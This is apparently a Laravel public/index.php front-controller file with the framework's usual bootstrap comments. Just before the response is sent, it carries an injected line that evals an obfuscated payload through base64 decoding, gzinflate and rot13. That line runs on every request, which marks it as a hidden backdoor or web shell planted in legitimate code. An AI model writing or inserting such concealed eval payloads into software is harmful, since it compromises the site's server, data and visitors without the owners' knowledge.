<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);

$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);

eval(str_rot13(gzinflate(base64_decode("fY5BTsMwEEX3nGKwUNUunDakqSJoLCEkbtAN6sYO9qQBGWcam7qIu+OmBYkNs/gafb2nmbCH6Y2ml5YMcjEQbhCbjTI4ncF1XQOLytnoU3FX5VXOriDNZALwr3S0Ab0Nh4DOk8ycytoDm8HnaJPzCti6Dztw0RpTb5lWHXy0BsP+jTslkSRyl4L0lolR+oMjvSLvrRxIw7ifWXAq8hU0vPi1fCGe1JHQBzlAMNBpJYdsPU/9BViKx0jWEJzuWofQpdehpx1F1ZA+scsfthTP6j1EggcFHBZ5VdwWi6pclQkqL9A8PSrOye6/vgE="))));

$response->send();

$kernel->terminate($request, $response);
